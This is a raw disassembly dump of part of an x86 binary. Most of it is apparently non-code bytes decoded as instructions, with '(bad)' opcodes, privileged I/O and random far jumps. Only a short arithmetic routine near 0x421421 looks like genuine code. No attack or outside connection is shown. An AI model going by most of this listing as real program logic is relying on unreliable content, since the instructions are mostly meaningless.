  420ca1:	fstp   st(3)
  420ca3:	or     BYTE PTR [edx],bh
  420ca5:	mov    ch,0x94
  420ca7:	sar    DWORD PTR [ecx],1
  420ca9:	pop    eax
  420caa:	inc    esp
  420cab:	pop    ds
  420cac:	xchg   ebx,eax
  420cad:	out    0xf3,al
  420caf:	cwde   
  420cb0:	rol    DWORD PTR [ebx-0x5defd484],cl
  420cb6:	in     al,0x32
  420cb8:	push   0x6c0184fc
  420cbd:	fst    QWORD PTR [edx+ebp*2-0x7c470835]
  420cc4:	dec    edx
  420cc5:	ss aam 0x75
  420cc8:	xor    eax,0x578b5202
  420ccd:	adc    ebp,esi
  420ccf:	inc    edi
  420cd0:	xchg   edx,eax
  420cd1:	es mov ch,0x8d
  420cd4:	lock or BYTE PTR [edx+0x35504b55],ah
  420cdb:	dec    ebx
  420cdc:	and    BYTE PTR [eax+0x5843ea9e],0x60
  420ce3:	sbb    esp,DWORD PTR [eax]
  420ce5:	xchg   esp,eax
  420ce6:	fdivr  QWORD PTR [eax+0x4a]
  420ce9:	adc    DWORD PTR [esi+0x7e921f86],0x60
  420cf0:	fild   QWORD PTR [eax+0x248b9374]
  420cf6:	cs mov ebx,0x6dfa3fa5
  420cfc:	inc    esp
  420cfd:	mov    dl,0x2d
  420cff:	dec    edi
  420d00:	xchg   DWORD PTR [edi],ecx
  420d02:	jno    0x420cc8
  420d04:	neg    BYTE PTR [ebx+0x67]
  420d07:	adc    edi,DWORD PTR [ebx-0x15]
  420d0a:	cdq    
  420d0b:	jmp    0x410d:0x9bf444a
  420d12:	stos   DWORD PTR es:[edi],eax
  420d13:	popf   
  420d14:	sahf   
  420d15:	pusha  
  420d16:	add    DWORD PTR ds:0x557873e0,esp
  420d1c:	ja     0x420d8f
  420d1e:	repz sbb ecx,0x9d0dd84a
  420d25:	mov    WORD PTR [ebx],cs
  420d27:	mov    al,0xdc
  420d29:	inc    eax
  420d2a:	pop    ebp
  420d2b:	cli    
  420d2c:	ins    BYTE PTR es:[edi],dx
  420d2d:	xchg   edi,eax
  420d2e:	sahf   
  420d2f:	adc    esi,edx
  420d31:	out    dx,al
  420d32:	mov    WORD PTR [eax],?
  420d34:	imul   edi,DWORD PTR [ecx-0x2b],0xfffffff3
  420d38:	out    dx,al
  420d39:	mov    cl,0x7d
  420d3b:	adc    DWORD PTR cs:[edi+esi*8+0x3474e669],0x30
  420d44:	pusha  
  420d45:	mov    DWORD PTR [edi],0x2f9b0b2b
  420d4b:	ja     0x420ce3
  420d4d:	pop    esp
  420d4e:	jb     0x420d07
  420d50:	std    
  420d51:	pop    es
  420d52:	lea    ebx,cs:[esi-0x65]
  420d56:	shl    ebp,0xca
  420d59:	sbb    ecx,DWORD PTR [edi]
  420d5b:	push   ebx
  420d5c:	push   esi
  420d5d:	scas   eax,DWORD PTR es:[edi]
  420d5e:	inc    ecx
  420d5f:	mov    ecx,0xbb18624d
  420d64:	add    ebp,ebx
  420d66:	loop   0x420ceb
  420d68:	xchg   edi,eax
  420d69:	(bad)  
  420d6a:	aad    0x1e
  420d6c:	xchg   edx,eax
  420d6d:	xchg   BYTE PTR [edx-0x5b48d8ea],dh
  420d73:	mov    ds:0x3c52b19,eax
  420d78:	test   al,0x5c
  420d7a:	jae    0x420d4d
  420d7c:	and    DWORD PTR [esi-0x5],ebp
  420d7f:	pop    esi
  420d80:	sar    DWORD PTR [eax+0x46b83270],0x4
  420d87:	push   ecx
  420d88:	jae    0x420e07
  420d8a:	loope  0x420dfe
  420d8c:	fld    TBYTE PTR [esi+eax*1+0x5d]
  420d90:	(bad)  
  420d92:	push   esp
  420d93:	mov    al,ds:0x38fdc37e
  420d98:	outs   dx,BYTE PTR ds:[esi]
  420d99:	popf   
  420d9a:	or     DWORD PTR [eax+edx*8-0x2aee8145],0xffffff8c
  420da2:	jne    0x420d81
  420da4:	xchg   edi,esp
  420da6:	js     0x420dcf
  420da8:	invd   
  420daa:	cmp    DWORD PTR [eax],0x841fbfd9
  420db0:	or     DWORD PTR [esi],esp
  420db2:	mov    al,0x96
  420db4:	cmp    DWORD PTR [esi-0x528f512c],edi
  420dba:	jl     0x420dcf
  420dbc:	sbb    esi,ebx
  420dbe:	lock and eax,0x72da621b
  420dc4:	rol    DWORD PTR [ebx+0x37],0x22
  420dc8:	mov    edx,cs
  420dca:	or     al,0x32
  420dcc:	test   eax,0xc6b761d7
  420dd1:	test   eax,eax
  420dd3:	scas   al,BYTE PTR es:[edi]
  420dd4:	xchg   edx,eax
  420dd5:	cs in  eax,dx
  420dd7:	sbb    DWORD PTR ds:0xe6037126,esp
  420ddd:	repz push ebx
  420ddf:	leave  
  420de0:	test   BYTE PTR [ecx],bl
  420de2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420de3:	mov    ss,WORD PTR [edi+ebp*2-0x7417d4fa]
  420dea:	mov    cl,0x89
  420dec:	xchg   esp,eax
  420ded:	mov    ebx,0x21873c5d
  420df2:	(bad)  
  420df3:	lods   al,BYTE PTR ds:[esi]
  420df4:	aam    0xd0
  420df6:	mov    ebp,?
  420df8:	fild   DWORD PTR [edi]
  420dfa:	jno    0x420de9
  420dfc:	mov    edi,fs
  420dfe:	push   esp
  420dff:	dec    eax
  420e00:	jb     0x420e1b
  420e02:	or     al,0x3d
  420e04:	ror    BYTE PTR [ecx-0x5c],0x4a
  420e08:	mov    eax,0xf9a03c9c
  420e0d:	mov    eax,ds:0x5738098a
  420e12:	jge    0x420e74
  420e14:	push   ds
  420e15:	xchg   eax,ebp
  420e17:	data16 aad 0x4d
  420e1a:	rcl    BYTE PTR [ebp-0x19],0xe6
  420e1e:	push   esi
  420e1f:	neg    BYTE PTR [edx+0x54]
  420e22:	adc    al,0xbd
  420e24:	popa   
  420e25:	adc    al,0xd4
  420e27:	stc    
  420e28:	out    dx,al
  420e29:	loop   0x420e3a
  420e2b:	das    
  420e2c:	push   ss
  420e2d:	mov    esi,0x60680e70
  420e32:	and    al,0x62
  420e34:	data16 sub BYTE PTR [ebx-0x50edde90],al
  420e3b:	and    DWORD PTR [esi],esp
  420e3d:	(bad)  
  420e3e:	inc    BYTE PTR [edx+0x2c]
  420e41:	(bad)
  420e44:	cmp    eax,0xcf464dcc
  420e49:	stos   DWORD PTR es:[edi],eax
  420e4a:	xor    al,BYTE PTR [edi]
  420e4c:	shr    BYTE PTR [ecx+eiz*4+0x0],cl
  420e50:	out    dx,al
  420e51:	(bad)  
  420e54:	icebp  
  420e55:	or     edx,DWORD PTR [eax+edi*2]
  420e58:	push   es
  420e59:	sbb    BYTE PTR [ecx],dh
  420e5b:	stos   DWORD PTR es:[edi],eax
  420e5c:	jp     0x420e2f
  420e5e:	scas   eax,DWORD PTR es:[edi]
  420e5f:	fistp  QWORD PTR [eax+0xf9fc4ec]
  420e65:	mov    ah,0xc2
  420e67:	fstp   TBYTE PTR [edx]
  420e69:	xchg   ebx,eax
  420e6a:	data16 adc al,cl
  420e6d:	push   esi
  420e6f:	sbb    ah,bl
  420e71:	xchg   esp,eax
  420e73:	xor    cl,0x5a
  420e76:	enter  0xedaa,0x60
  420e7a:	sub    DWORD PTR [edi],eax
  420e7c:	push   ecx
  420e7d:	push   DWORD PTR [edx-0x4128c381]
  420e83:	add    al,0xfb
  420e85:	cmp    DWORD PTR [edi+0x1130e4b5],0xc04c1f12
  420e8f:	or     edi,esp
  420e91:	jmp    0x8655:0xd332d8e0
  420e98:	xchg   BYTE PTR [ebp+0x6c4d7c57],cl
  420e9e:	and    bh,ch
  420ea0:	xchg   ebx,esi
  420ea2:	xchg   DWORD PTR [edx],ebp
  420ea4:	mov    ds:0x5f05e5d,eax
  420ea9:	icebp  
  420eaa:	fisub  DWORD PTR [edi-0x74895f25]
  420eb0:	(bad)  
  420eb1:	push   ecx
  420eb2:	or     DWORD PTR [edx],esp
  420eb4:	stos   BYTE PTR es:[edi],al
  420eb5:	xor    eax,0xa786f52f
  420eba:	ret    0x9c0e
  420ebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ebe:	pop    esp
  420ebf:	imul   edi,DWORD PTR [edi-0x48556e5d],0x5f
  420ec6:	nop
  420ec7:	cmp    bh,cl
  420ec9:	mov    eax,0x49dac71c
  420ece:	sbb    BYTE PTR [ebx-0x4a94767a],bh
  420ed4:	xor    al,0x40
  420ed6:	inc    ebp
  420ed7:	imul   esp,DWORD PTR [ebx-0x7d9bd7e5],0xc1d141e
  420ee1:	imul   edi,DWORD PTR [edi+0x1a10f3a2],0x6e
  420ee8:	sub    BYTE PTR es:[ebp+0x3c08c20b],ah
  420eef:	mov    DWORD PTR [ecx+eiz*1+0x2c],esi
  420ef3:	fadd   DWORD PTR ss:[esi+0x32]
  420ef7:	cs daa 
  420ef9:	bound  edi,QWORD PTR [edi+ebp*8+0x11]
  420efd:	(bad)  
  420efe:	shl    ebp,cl
  420f00:	mov    ch,0xa9
  420f02:	or     ah,BYTE PTR [edx]
  420f04:	shl    BYTE PTR [ebp+0x48],1
  420f07:	pop    es
  420f08:	mov    dl,0x56
  420f0a:	adc    ch,dl
  420f0c:	sti    
  420f0d:	xchg   esp,eax
  420f0e:	cwde   
  420f0f:	mov    al,ds:0x382c3726
  420f14:	addr16 mov al,0x64
  420f17:	popf   
  420f18:	daa    
  420f19:	repnz es aam 0x40
  420f1d:	mov    edi,DWORD PTR [ebp-0x755722c4]
  420f23:	bnd jb 0x420f83
  420f26:	(bad)  
  420f28:	icebp  
  420f29:	push   ebx
  420f2a:	jecxz  0x420f80
  420f2c:	cmp    DWORD PTR [edi],esp
  420f2e:	mov    edx,0xfc3195fa
  420f33:	pop    esi
  420f34:	stos   BYTE PTR es:[edi],al
  420f35:	test   al,0xc
  420f37:	call   0x7f5d:0xef5ddbe3
  420f3e:	jl     0x420ede
  420f40:	xchg   ebp,eax
  420f41:	pop    es
  420f42:	into   
  420f43:	xor    al,0x3c
  420f45:	out    dx,eax
  420f46:	mov    ebx,0x556d6b75
  420f4b:	xor    ecx,edx
  420f4d:	jge    0x420f73
  420f4f:	dec    ebp
  420f50:	cmc    
  420f51:	or     BYTE PTR [ecx-0x5c6d097d],al
  420f57:	aaa    
  420f58:	aad    0xe4
  420f5a:	xchg   ebp,eax
  420f5b:	js     0x420ef1
  420f5d:	je     0x420f6b
  420f5f:	push   edi
  420f60:	push   edx
  420f61:	aaa    
  420f62:	mov    ds:0x7159fc72,al
  420f67:	in     al,dx
  420f68:	pop    eax
  420f69:	push   cs
  420f6a:	push   esi
  420f6b:	jne    0x420fc4
  420f6d:	clc    
  420f6e:	xor    al,0x6d
  420f70:	add    DWORD PTR [esi+edx*4+0x3],0xffffff94
  420f75:	jno    0x420f46
  420f77:	dec    ecx
  420f78:	xor    eax,0xad01d0f6
  420f7d:	sti    
  420f7e:	mov    ah,0x45
  420f80:	pop    ecx
  420f81:	aad    0x10
  420f83:	pushf  
  420f84:	xor    edx,DWORD PTR [ecx+0x30]
  420f87:	pop    ds
  420f88:	xchg   esi,eax
  420f89:	test   DWORD PTR [ebx+0x5da6b1d4],edx
  420f8f:	adc    ebp,ebp
  420f91:	leave  
  420f92:	sub    DWORD PTR [edi+edi*2-0x695a4575],edx
  420f99:	or     cl,BYTE PTR [ebx+edi*2-0x17]
  420f9d:	out    dx,eax
  420f9e:	ret    
  420f9f:	and    DWORD PTR [edx],0x7a
  420fa2:	test   eax,0x83cbb74
  420fa7:	dec    edx
  420fa8:	test   eax,0x57989b13
  420fad:	gs ret 
  420faf:	xchg   edx,eax
  420fb0:	sar    WORD PTR [edi-0x7d],1
  420fb4:	add    BYTE PTR [edx+eax*4+0x8],0x25
  420fb9:	pusha  
  420fba:	retf   0x3cd5
  420fbd:	inc    edi
  420fbe:	sub    al,0x6a
  420fc0:	sbb    eax,0xe2c4a51f
  420fc5:	xor    al,BYTE PTR [eax+0x25]
  420fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fc9:	xchg   ecx,eax
  420fca:	jnp    0x420fb6
  420fcc:	dec    edi
  420fcd:	add    eax,0x46cf66cc
  420fd2:	in     eax,dx
  420fd3:	add    al,BYTE PTR [ecx+0x3c7ede36]
  420fd9:	adc    ah,BYTE PTR [edi-0x14ee2d11]
  420fdf:	mov    dl,0x73
  420fe1:	in     al,dx
  420fe2:	nop
  420fe3:	mov    edi,DWORD PTR [ecx+0x3c]
  420fe6:	jecxz  0x420f98
  420fe8:	cmp    al,0xca
  420fea:	clc    
  420feb:	test   DWORD PTR ds:0xba1bc5ef,edx
  420ff1:	or     al,BYTE PTR [esi-0x4c6b98d9]
  420ff7:	les    edx,FWORD PTR [ebx]
  420ff9:	arpl   WORD PTR [ebx],sp
  420ffb:	ins    BYTE PTR es:[edi],dx
  420ffc:	leave  
  420ffd:	js     0x420fd2
  420fff:	mov    al,0x76
  421001:	into   
  421002:	inc    edi
  421003:	or     al,0x89
  421005:	pusha  
  421006:	ss add ebp,ebx
  421009:	mov    ah,0x71
  42100b:	xchg   edi,eax
  42100c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42100d:	ds push ecx
  42100f:	aas    
  421010:	dec    esi
  421011:	(bad)  [esi+0x53a74923]
  421017:	in     al,0x19
  421019:	push   ss
  42101a:	xor    DWORD PTR [edx+eax*1+0x3a],eax
  42101e:	into   
  42101f:	out    0x63,al
  421021:	fxch   st(6)
  421023:	lea    ebx,[edi]
  421025:	mov    cl,0x51
  421027:	mov    esp,0xc3ef5f0e
  42102c:	dec    edi
  42102d:	(bad)  
  42102e:	aad    0xa1
  421030:	into   
  421031:	in     eax,dx
  421032:	outs   dx,DWORD PTR ds:[esi]
  421033:	push   esp
  421034:	jnp    0x420fef
  421036:	jae    0x42102e
  421038:	add    DWORD PTR [edx+edx*4-0x67],ecx
  42103c:	lods   eax,DWORD PTR ds:[esi]
  42103d:	loope  0x4210bc
  42103f:	or     al,0xfd
  421041:	icebp  
  421042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421043:	mov    DWORD PTR [edx-0x4b6b33cd],ebx
  421049:	loop   0x420fd7
  42104b:	cmp    al,0x3
  42104d:	stos   BYTE PTR es:[edi],al
  42104e:	fist   DWORD PTR [ebp+0x1f6876d7]
  421054:	and    DWORD PTR [ebp+0x50],eax
  421057:	xchg   esp,eax
  421058:	push   esp
  421059:	in     al,dx
  42105a:	test   eax,0x125b7c53
  42105f:	dec    esi
  421060:	into   
  421061:	jo     0x42103c
  421063:	mov    ebx,0x43078bdc
  421068:	pop    eax
  421069:	jl     0x42106d
  42106b:	fdiv   QWORD PTR [bp+si]
  42106e:	mov    ecx,0x6dda13d1
  421073:	jg     0x4210e3
  421075:	icebp  
  421076:	mov    dh,BYTE PTR [ebp+0x7febd980]
  42107c:	push   edx
  42107d:	pop    es
  42107e:	ss pop ss
  421080:	xor    esp,ebx
  421082:	dec    edi
  421083:	pop    eax
  421084:	fadd   QWORD PTR [edi+0x490aeb1c]
  42108a:	les    ebp,FWORD PTR [edi+ecx*2+0x5a0fef17]
  421091:	xlat   BYTE PTR ds:[ebx]
  421092:	mov    ebp,0x8a9e3a5d
  421097:	xor    eax,edi
  421099:	inc    esp
  42109a:	jmp    0x4210c5
  42109c:	inc    ecx
  42109d:	test   al,0xad
  42109f:	sbb    cl,al
  4210a1:	inc    esi
  4210a2:	or     eax,0xe62bfbf6
  4210a7:	mov    dh,BYTE PTR [esi]
  4210a9:	jecxz  0x4210ff
  4210ab:	in     al,dx
  4210ac:	test   edi,ebx
  4210ae:	addr16 jge 0x421072
  4210b1:	clc    
  4210b2:	mov    eax,ds:0x7501505
  4210b7:	mov    edi,0xe665deb7
  4210bc:	jl     0x421081
  4210be:	daa    
  4210bf:	test   al,0x8e
  4210c1:	push   edx
  4210c2:	popf   
  4210c3:	or     ch,BYTE PTR [eax]
  4210c5:	fisub  WORD PTR [ebx-0x4f4e1d9d]
  4210cb:	mov    al,ds:0x988cabde
  4210d0:	or     bl,BYTE PTR [eax+0x3eab5ebc]
  4210d6:	adc    BYTE PTR [edx-0x32],0xb9
  4210da:	xor    BYTE PTR [esi+0x16],ch
  4210dd:	add    DWORD PTR [esi],edi
  4210df:	lods   al,BYTE PTR ds:[esi]
  4210e0:	xchg   ecx,eax
  4210e1:	sti    
  4210e2:	test   BYTE PTR [edx],0x24
  4210e5:	and    edx,DWORD PTR [ecx+0x11]
  4210e8:	sub    al,0x30
  4210ea:	sub    al,0x8c
  4210ed:	adc    edx,DWORD PTR [ebp+0x71428824]
  4210f3:	sub    DWORD PTR [ebx],ecx
  4210f5:	jmp    0xd5cf:0x68ebad65
  4210fc:	fistp  WORD PTR [edx]
  4210fe:	sti    
  4210ff:	xor    eax,0x67b82247
  421104:	jmp    0xea86:0x429e8f6f
  42110b:	jmp    0x4210ab
  42110d:	jnp    0x42115c
  42110f:	pop    edx
  421110:	out    dx,eax
  421111:	mov    ch,ah
  421113:	inc    esi
  421114:	iret   
  421115:	fprem  
  421117:	xchg   ecx,eax
  421118:	iret   
  421119:	(bad)  
  42111a:	pop    ebp
  42111b:	mov    bh,BYTE PTR [ebx+0x5f]
  42111e:	(bad)  
  42111f:	jmp    0xb916:0xd097019a
  421126:	mov    ecx,0x9eb03392
  42112b:	rcr    edx,cl
  42112d:	mov    ds:0xcd4b7b42,al
  421132:	mov    esp,0x742bddf1
  421137:	xchg   esp,eax
  421138:	and    DWORD PTR [ebx-0x1ebe1f7f],ebp
  42113e:	push   esp
  42113f:	sahf   
  421140:	sub    DWORD PTR [eax+0x5a],0x3bb3a9bb
  421147:	dec    esp
  421148:	and    edx,DWORD PTR [edx]
  42114a:	push   0xdb4b0e73
  42114f:	xchg   DWORD PTR [ebp+0xfed1df9],ecx
  421155:	test   DWORD PTR [edi+0x4f02b65f],edx
  42115b:	push   esi
  42115c:	push   ds
  42115d:	xchg   edi,eax
  42115e:	xor    DWORD PTR [ebp+ebp*1+0x11],esi
  421162:	aas    
  421163:	mov    al,0x69
  421165:	mov    ebx,0xc608bb79
  42116a:	cmp    cl,0x1d
  42116d:	leave  
  42116e:	mov    al,ds:0x5aa8295e
  421173:	call   0x7aa9633b
  421178:	inc    edi
  421179:	and    eax,0xe19aaa8c
  42117e:	mov    ds:0x996fe8a,al
  421183:	jl     0x421176
  421185:	ja     0x4211ff
  421187:	dec    edx
  421188:	jmp    0x6e47620a
  42118d:	arpl   WORD PTR [esi-0x538e0bc],cx
  421193:	or     eax,0x943b1750
  421198:	or     al,0xd
  42119a:	cli    
  42119b:	and    al,0x9
  42119d:	mov    edx,0xdc1eb46b
  4211a2:	add    DWORD PTR [esi-0x413d4be4],0x6f
  4211a9:	aad    0xb5
  4211ab:	push   ebx
  4211ac:	retf   
  4211ad:	mov    eax,0x8cd76a07
  4211b2:	mov    ss,ebx
  4211b4:	das    
  4211b5:	jbe    0x4211f7
  4211b7:	les    edi,FWORD PTR [edi]
  4211b9:	ins    BYTE PTR es:[edi],dx
  4211ba:	js     0x421211
  4211bc:	ja     0x42120c
  4211be:	out    dx,al
  4211bf:	jmp    0x8abf0f23
  4211c4:	pop    es
  4211c5:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4211c7:	pushf  
  4211c8:	pop    es
  4211c9:	inc    eax
  4211ca:	fistp  QWORD PTR [ebx-0x1de66136]
  4211d0:	int3   
  4211d1:	xor    eax,0xa278a4d7
  4211d6:	ss mov ecx,0x61c2f506
  4211dc:	push   0x44c1c4d0
  4211e1:	cmp    eax,0xf8040440
  4211e6:	sbb    eax,0x819d6ae7
  4211eb:	add    dl,cl
  4211ed:	jg     0x4211df
  4211ef:	test   eax,0x5c134e
  4211f4:	mov    esi,0xaafb2385
  4211f9:	enter  0x8d7b,0x70
  4211fd:	push   ebp
  4211fe:	imul   edi,DWORD PTR [ecx],0xa364543
  421204:	and    BYTE PTR [edx-0x614bdf08],bl
  42120a:	jb     0x421269
  42120c:	fld    DWORD PTR [edx+ebp*8+0x3b]
  421210:	push   eax
  421211:	cmc    
  421212:	mov    dl,0x10
  421214:	cmp    al,0xc9
  421216:	adc    bh,ah
  421218:	fnsetpm(287 only) 
  42121a:	pop    es
  42121b:	retf   0xe9ad
  42121e:	iret   
  42121f:	shr    DWORD PTR [edx-0x7552cfc8],cl
  421225:	pop    esi
  421226:	xchg   ebx,eax
  421227:	inc    eax
  421228:	mov    ecx,0xe8e9e3c2
  42122d:	and    eax,0xfde6bd49
  421232:	pop    esi
  421233:	and    al,0x1e
  421235:	cli    
  421236:	aam    0xc7
  421238:	scas   al,BYTE PTR es:[edi]
  421239:	(bad)  
  42123a:	or     DWORD PTR [edx],ebp
  42123c:	push   0x511a609
  421241:	cmc    
  421242:	mov    ah,0xeb
  421244:	sbb    edx,DWORD PTR [ebx+eax*8]
  421247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421248:	xor    DWORD PTR [edx-0x12],esp
  42124b:	test   eax,0xe036a88f
  421250:	ret    
  421251:	push   esi
  421252:	and    al,ch
  421254:	mov    ah,ah
  421256:	push   0xea34e2c3
  42125b:	xor    DWORD PTR [esi+0x41],ebx
  42125e:	xchg   ebp,eax
  42125f:	aam    0x8
  421261:	push   0x1e
  421263:	jmp    0xd750:0x4b2d1a16
  42126a:	add    ecx,0x7f
  42126d:	aad    0xf9
  42126f:	cmp    al,0xbe
  421271:	pop    ebx
  421272:	cmc    
  421273:	mov    ds:0x598ba5a0,al
  421278:	xchg   ebx,eax
  421279:	(bad)
  42127c:	jle    0x421294
  42127e:	popa   
  42127f:	xchg   ebp,eax
  421280:	bound  esp,QWORD PTR [edi-0x1a9d27a4]
  421286:	shl    BYTE PTR [ebp-0x7e],1
  421289:	(bad)  
  42128a:	cs push ss
  42128c:	mov    BYTE PTR [edx-0x5ff0d534],bl
  421292:	push   ss
  421293:	sub    al,0x5f
  421295:	xor    DWORD PTR [edi-0x7d],ebp
  421298:	push   edx
  421299:	sbb    BYTE PTR [ebx-0x1b],cl
  42129c:	jle    0x42123e
  42129e:	cld    
  42129f:	pop    eax
  4212a0:	xchg   edi,eax
  4212a1:	je     0x42122b
  4212a3:	and    DWORD PTR [edx-0x3c],ebp
  4212a6:	adc    bp,WORD PTR [ecx+edx*4+0x2c]
  4212ab:	mov    dh,0xe4
  4212ad:	fst    DWORD PTR [edx+0x3a]
  4212b0:	mov    ebx,0x97301ff7
  4212b5:	test   al,0x54
  4212b7:	and    dh,0x2
  4212ba:	and    dl,cl
  4212bc:	cwde   
  4212bd:	int3   
  4212be:	inc    ebx
  4212bf:	lock add BYTE PTR [eax],ah
  4212c2:	mov    eax,0xa9ef64b6
  4212c7:	mov    ds:0xc4504978,eax
  4212cc:	sbb    eax,0xfa6470d8
  4212d1:	xor    DWORD PTR [ebp-0x2e],ebp
  4212d4:	mov    esi,0x1ff566dd
  4212d9:	stos   BYTE PTR es:[edi],al
  4212da:	lahf   
  4212db:	jb     0x42125d
  4212dd:	cwde   
  4212de:	push   0xc7d31816
  4212e3:	pushf  
  4212e4:	pop    edi
  4212e5:	leave  
  4212e6:	inc    edi
  4212e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212e8:	loope  0x42135f
  4212ea:	jmp    0x1b72:0x85431f03
  4212f1:	pop    ebx
  4212f2:	or     dh,0xe8
  4212f5:	shl    DWORD PTR [ebp-0xbca1328],cl
  4212fb:	lods   eax,DWORD PTR ds:[esi]
  4212fc:	adc    ecx,DWORD PTR [eax+0x7041a49b]
  421302:	stc    
  421303:	out    0x38,eax
  421305:	in     al,0xb2
  421307:	cs js  0x421300
  42130a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42130b:	repz shl DWORD PTR [edi],0xb6
  42130f:	push   es
  421310:	pop    ebp
  421311:	jl     0x42138a
  421313:	ins    BYTE PTR es:[edi],dx
  421314:	out    0x9d,eax
  421316:	sbb    BYTE PTR [edx-0x52d6e09c],dl
  42131c:	dec    edx
  42131d:	mov    edx,0xb4dee5b1
  421322:	in     al,0xd9
  421324:	push   ebp
  421325:	in     al,0x6f
  421327:	jns    0x4212ef
  421329:	mov    al,0xbe
  42132b:	xchg   DWORD PTR [ecx-0x1e],esp
  42132e:	add    BYTE PTR [edi+0x5e],ah
  421331:	mov    ds:0x3d855f34,al
  421336:	xchg   ebx,eax
  421337:	pop    es
  421338:	jmp    0xdd3a08e9
  42133d:	or     bl,BYTE PTR [edi-0x50daa7b]
  421343:	mov    ebp,0xf97a275d
  421348:	fimul  DWORD PTR ds:0x64834f41
  42134e:	(bad)  
  42134f:	retf   
  421350:	jg     0x4213b9
  421352:	cmp    edi,ecx
  421354:	mov    edi,0x3484118a
  421359:	adc    ecx,edi
  42135b:	loop   0x4213c4
  42135d:	and    esp,DWORD PTR ds:[edi-0x3cbc7594]
  421364:	inc    edx
  421365:	xor    eax,0x8e5e527e
  42136a:	je     0x421378
  42136c:	and    edx,DWORD PTR [ecx+edx*8]
  42136f:	mov    ch,0xe9
  421371:	xchg   edx,eax
  421372:	cmp    eax,ecx
  421374:	jne    0x42137f
  421376:	ins    BYTE PTR es:[edi],dx
  421377:	out    dx,eax
  421378:	shr    DWORD PTR [eax+edx*1-0x1b],cl
  42137c:	fisub  DWORD PTR [ebx-0x36518da1]
  421382:	sub    BYTE PTR [edx+ecx*1-0x7417b5ed],ah
  421389:	sub    DWORD PTR [edi+0x37],edx
  42138c:	push   ebp
  42138d:	cli    
  42138e:	push   ss
  42138f:	and    DWORD PTR [ebp+0x79],ecx
  421392:	bound  ebx,QWORD PTR [esi+esi*2]
  421395:	aad    0xc4
  421397:	ins    BYTE PTR es:[edi],dx
  421398:	ins    BYTE PTR es:[edi],dx
  421399:	fnstsw WORD PTR [eax+ebx*2+0x17]
  42139d:	mov    edi,0xfb68ea3f
  4213a2:	mov    ds:0x502e128b,al
  4213a7:	pop    es
  4213a8:	out    0x52,al
  4213aa:	loop   0x421397
  4213ac:	cmp    eax,DWORD PTR [edi]
  4213ae:	mov    cl,BYTE PTR [ebx+esi*2-0x7cebd5f5]
  4213b5:	add    eax,eax
  4213b7:	xchg   BYTE PTR [edi+0x6234c39],bh
  4213bd:	(bad)  
  4213be:	retf   
  4213bf:	leave  
  4213c0:	pop    ds
  4213c1:	xor    BYTE PTR [esi+0x17ef200e],0x19
  4213c8:	inc    esp
  4213c9:	sub    cl,BYTE PTR [edx]
  4213cb:	mov    esi,DWORD PTR [esi+0x35]
  4213ce:	push   es
  4213cf:	mov    eax,ds:0xc3fb6aa
  4213d4:	dec    edx
  4213d5:	out    dx,eax
  4213d6:	pusha  
  4213d7:	mov    esi,0x795f0b09
  4213dc:	fld    QWORD PTR [eax+ebx*2+0x1]
  4213e0:	ins    DWORD PTR es:[edi],dx
  4213e1:	dec    ebp
  4213e2:	xor    eax,0xb848e815
  4213e7:	jp     0x4213d0
  4213e9:	push   es
  4213ea:	sub    ch,dh
  4213ec:	mov    ds:0x673d4f6e,al
  4213f1:	mov    al,ds:0xb4fc6b01
  4213f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213f7:	mov    dh,BYTE PTR [ecx+0x4f]
  4213fa:	test   eax,0x6dd37656
  4213ff:	and    ebx,ebx
  421401:	fsub   QWORD PTR [edi]
  421403:	fdiv   QWORD PTR [esi+eiz*1]
  421406:	mov    ebp,0x23a7fb12
  42140b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42140c:	dec    ebx
  42140d:	ins    DWORD PTR es:[edi],dx
  42140e:	mov    cs,WORD PTR [ebx-0x37ccf7b3]
  421414:	add    ecx,esi
  421416:	jne    0x41f07f
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0xf7fc88e2
  42147c:	mov    al,ds:0x1cd7725
  421481:	add    BYTE PTR [edx+0x0],ah
  421484:	add    BYTE PTR [eax],al
  421486:	add    al,0x2
  421488:	popf   
  421489:	rol    DWORD PTR [ecx-0xe],cl
  42148c:	cmp    al,0xca
  42148e:	xchg   esp,eax
  42148f:	shr    BYTE PTR [ecx-0x2a9b6bca],1
  421495:	sub    edi,0xdc110d77
  42149b:	push   ebp
  42149c:	in     eax,0x55
  42149e:	loop   0x421516
  4214a0:	hlt    
  4214a1:	inc    eax
  4214a2:	cmp    ah,BYTE PTR [edx]
  4214a4:	nop
  4214a5:	cmp    al,0xf8
  4214a7:	out    dx,al
